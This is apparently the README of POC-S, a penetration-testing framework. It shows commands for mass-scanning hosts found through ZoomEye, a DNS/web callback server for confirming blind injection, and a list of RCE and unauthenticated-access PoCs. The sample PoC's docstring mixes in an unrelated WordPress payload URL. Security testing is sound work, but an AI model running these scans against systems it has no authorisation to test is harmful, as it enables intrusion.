# POC-S: *POC-T Strengthen Version POC-T加强版* 

POC-T的wiki文档请看doc目录

## 法律免责声明
未经事先双方同意，使用POC-S攻击目标是非法的。
POC-S仅用于安全测试目的

## 特点
- 兼容POC-T的语法
- 良好的poc分类，灵活的poc加载方式，支持单文件，批量，任意目录的加载方式
- 提供pocs/poc-s终端命令，让框架和poc分离，可以将自定义的poc放在任意目录
- 提供简易的dns平台，只需要一个域名一个公网ip即可运行, 可用于快速验证命令盲注和sql盲注，简单高效。
- 提供良好的单元测试脚本

TODO
- [x] 根据vulhub靶机及开源项目收集和完善POC, 具体可以看我的POC分类
- [x] 提供--init参数动态更新tookit.conf配置文件,eg: --init zoomeye, 初始化zoomeye的配置信息
- [x] 添加dnslog, weblog平台用于快速验证漏洞
- [x] 添加ceye.py和dnslog.py 两种验证插件
- [ ] 添加pocsapi.py, 类似sqlmapapi的功能
- [ ] 增加py3版本的POC-S

## 使用 
> 由于第三方接口需要认证，可以通过--init参数来初始化你的相关接口配置，eg: --init zoomeye

	pip install pocs

源码安装: 

```
	git clone https://github.com/jiangsir404/POC-S.git
	python setup.py install
```

> 如果pip按照pcos出现Some files missing的报错，则需要去到pocs的安装目录(python2.7\Lib\site-packages\pocs)重命名tookit.conf.
> 如果出现`WARNING: Generating metadata for package cachetools produced metadata for project name unknown. Fix your #egg=cachetools fragments.`报错，则是包依赖的问题
> 请检测并更新几个包的版本的问题: setuptools==39.0.1 cachetools==3.1.1 google-api-python-client==1.7.11

1. 更加灵活的插件加载方式

```
pocs -s test/test2.py -iS 127.0.0.1 #加载script/test/test2.py脚本
pocs -s test2 -iS 127.0.0.1 # 加载script/test2.py脚本

pocs -b test -iS 127.0.0.1 # 批量加载/script/test目录下的所有脚本
pocs -b test -s test2.py -iS 127.0.0.1 #加载script/test/test2.py脚本

pocs -s myself_script.py -iS 127.0.0.1 # 加载自定义的脚本和脚本目录
pocs -b mydir -iS 127.0.0.1
```

2. 搜索引擎的利用
```
pocs --init zoomeye //初始化zoomeye的配置信息
pocs -b redis -t 50 -aZ "port:6379" --limit 50 -o res.txt
pocs -s test2.py -aZ "ThinkPHP"
```

利用ZoomEye批量搜索CNVD-2020-10487 tomcat ajp lfi漏洞

	pip install pocs==1.3
	pocs -b apache -aZ "app:tomcat" --limit 50 -t 30 -o ajp.txt

![](test.png)

3. dnslog平台使用

如果你还在纠结于ceye的不稳定，没有时间精力搭建DNSLog平台(需要两个域名，一个公网ip, 且域名还需要能够修改dns服务器)
那么不妨试一试POC-S提供的简易dnslog平台，只需要一个域名和一个公网ip即可搭建，提供api接口进行验证(无界面)

假设dnslog.xxx.cn是你的公网域名，x.x.x.x是公网ip，请确保dnslog.xxx.cn可以正常解析到x.x.x.x, 否则无法正常访问api
在公网(x.x.x.x)运行命令: 
```
pip install pocs
pocs_dnslog -h 0.0.0.0 -p 88(如果不是pip安装的可以直接运行pocs.dnslog.py脚本)
>>> dns domain: dnslog.xxx.cn
>>> api key: rivir
```

dns log命令，只支持nslookup命令: `nslookup 1234.dnslog.xxx.cn x.x.x.x`  
> 如果你想用ping 1234.dnslog.xxx.cn命令，也可以给xxx.cn域名配置自定义的域名服务器(参考DNSLog的配置)

web log命令: `curl xxx.cn:88/weblog/poc123`

api接口地址: `http://x.x.x.x:88/api/?token={token}&type={dns}&filter=1234.pocs.xxx.cn`

## POC
pocs 提供更加灵活的插件分类方式，目前收集到的总结有四类POC: Fuzz POC, OWASP POC, Vuln POC, Tool POC.  POC这块会尽量收集一些github上面已有的POC, 但不会太多，还是需要个人自己去收集整理。f  

POC编写会尽可能规范，遵循POC-T的编写风格。eg如下
```
#!/usr/bin/env python		
#coding:utf-8

"""
ThinkPHP5 <=5.0.22/<=5.1.29 远程代码执行漏洞

Desc
    2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个5.x系列所有版本存在被getshell的高风险漏洞。
    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，
    受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。
Version
	ThinkPHP5.0 版本 <= 5.0.22 ThinkPHP5.1 版本 <= 5.1.29
Usage:
	1. python POC-S.py -s 
	2. POC: /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://lj.s7star.cn/info.txt
Referer
	https://www.seebug.org/vuldb/ssvid-9771
"""

import requests

def poc(url):
    pass
```

### Vuln POC
主要来源于vulhub的插件编写 以及 POC-T自带的插件poc, 只添加实际

- [x] apache
	- [x] CNVD-2020-10487 tomcat-ajp-lfi.py
	- [ ] tomcat-upload.py
    - [ ] tomcat-weak-pass.py
    
- [x] weblogic
	- [x] weblogic-ssrf-netmap.py  cve-2014-4210
	- [x] weblogc-wls-rce.py (CVE-2017-10271)
	- [ ] weblogic-upload-getshell.py (CVE-2018-2894)
	- [ ] weblogic-deserial-cve20192725.py (CVE-2019-2725)
	- [ ] CVE-2019-2890

- [ ] thinkphp
	- [x] 5-rce
	- [x] 5.0.23-rce

- [x] spring
    - [x] spring-oauth2-rce.py
    - [ ] cve-2018-1273
- [x] Citrix
    - [ ] cve-2019-19781
- [x] Jboss
    - [ ] jboss-rce.py
    - [ ] CVE-2017-12149
    - [ ] CVE-2013-4810

- [ ] unauth
	- [x] redis-unauth.py
	- [x] mongodb-unauth.py
	- [x] memcached-unauth.py
	- [x] elasticsearch-unauth.py
	- [x] kubernetes-unauth.py
	- [x] jenkins-unauth.py
	- [ ] docker-unauth-rce.py
	- [ ] hadoop-unauth.py

- [ ] supervisor
	- [x] supervisord-RCE-CVE-2017-11610.py

- [ ] weakpass
	- [ ] mysql
	- [ ] redis
	- [ ] mongo
	- [ ] sqlserver
	- [ ] ftp
	- [ ] telent
	- [ ] web弱口令(通用无验证码后台)
	- [ ] http-basic-auth
	- [ ] coremail
	...

- [ ] phpmyadmin
	- [x] phpmyadmin-auth-rce.py
	- [ ] phpmyadmin4.8.1-RFI.py

- [ ] kibana
	- cve-2019-7609
	- cve-2018-17246

- [ ] php
	- [x] fpm-rce.py
	- [ ] CVE-2019-11043
	- [ ] CVE-2018-19518

- [ ] struts2
    - [x] s2-005.py
    - [x] s2-015.py
    - [x] s2-016.py
    - [x] s2-032.py
    - [x] s2-045.py
    - [x] s2-052.py
    - [x] s2-053.py
    - [x] s2-058.py
    - [x] struts2-devmode.py


- [ ] discuz
	- [ ] x3.4-arbitrary-file-deletion

- [ ] zabbix
	- [x] zabbix-jsrpc-mysql-exp.py
	- [x] zabbix-jsrpc-sqli.py
	- [x] zabbix-weakpass.py
	- [x] zabbix_latest_sqli.py

- [x] dns-zone-transfer

- [ ] confluence
	- [x] confulence-traversal.py
	- [ ] confluence 路径穿越与命令执行漏洞


### Fuzz POC
来源: boy-hack/POC-T

- bakfile: 备份文件检测
- crossdomain: crossdomain
- dzxss 
- gitleak
- issparse
- ms15-034
- phpinfo
- phpmyadmin
- svnleak
- swf
- tomcat_xmlleak
- wordspace

### OWASP POC
来源hunter的检测脚本

- [ ] cmd_exec
- [ ] sql_injection
- [ ] xss
- [ ] xxe
- [ ] csrf
- [ ] jsonp_xss
- [ ] jsonp_hijacking
- [ ] file_read
- [ ] ssti
- [ ] ssrf


### Tool Poc
一些常见的工具类POC, 提供搜索引擎，信息查询等功能

- bing-dork bing 搜索
- bingc 基于Bing搜索引擎的 IP反查域名, C段域名
- google-dork google搜索
- cdn-detect cdn检测
- waf 检测waf 并返回没有waf的url
- craw 爬取链接中的相关地址
- vulscan 检测sql注入漏洞
- portscan 端口扫描，检测弱口令服务
- [ ] domain2ip 域名查询ip
- [ ] whois 查询whois信息
- [ ] icp icp查询


其他开源的POC比如https://github.com/boy-hack/airbug 项目收集了一些poc可以直接使用，但有一个HackReqeust库是py3的，需要改一下成Python2的， 可以直接安装我改过后的py2库:https://github.com/jiangsir404/hack-requests 

